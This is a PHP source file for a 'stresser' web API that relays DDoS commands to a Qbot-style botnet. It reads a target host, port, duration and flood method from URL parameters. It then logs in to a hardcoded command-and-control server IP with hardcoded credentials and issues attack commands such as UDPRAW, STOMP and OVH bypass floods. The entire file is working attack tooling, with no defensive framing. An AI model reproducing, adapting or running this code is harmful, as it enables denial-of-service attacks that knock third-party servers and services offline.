<?php
 // QBOT API SYSTEM FOR A STRESSER
//API Link: http://46.249.32.109/API.php?&host=$host&port=$port&time=$time&type=$method
set_time_limit(0);
 
//CNC SERVER IP
$server = "205.185.122.109";
 
//CNC PORT
$conport = 443;
 
//Net Login
$username = "API";
$password = "API123.123.";

$activekeys = array();

$method = $_GET['type'];
$target = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];
 
 
//Commands (change accordingly)
if($method == "GAME-KILLER"){$command = "!* GAME-KILLER $target $port $time 32 1024 10";}
if($method == "STOMP"){$command = "!* STOMP $target $port $time 32 ALL 1024 10";}
if($method == "TCP-RAPE"){$command = "!* JUNK $target $port $time ";}
if($method == "COD-KILL"){$command = "!* CHOOPA $target $port $time ";}
if($method == "SSH-Bypass"){$command = "!* OVH $target $port $time 5 ";}
if($method == "RANDHEX"){$command = "!* RANDHEX $target $port $time ";}
if($method == "TCP-KILL"){$command = "!* TLS $target $port $time ";}
if($method == "NFO"){$command = "!* NFOV6 $target $port $time ";}
if($method == "UDPRAW"){$command = "!* UDPRAW $target $port $time ";}
if($method == "UDPBYPASS"){$command = "!* UDPBYPASS $target $port $time 120";}
 
$sock = fsockopen($server, $conport, $errno, $errstr, 2);
 
if(!$sock){
        echo "Couldn't Connect To CNC Server...";
} else{
        print(fread($sock, 1024)."\n");
        fwrite($sock, $username . "\n");
        echo "<br>";
        print(fread($sock, 1024)."\n");
        fwrite($sock, $password . "\n");
        echo "<br>";
        if(fread($sock, 1024)){
                print(fread($sock, 1024)."\n");
        }

        fwrite($sock, $command . "\n");
        sleep(4);
        fclose($sock);
        echo "<br>";
        echo "> $command ";
}
?>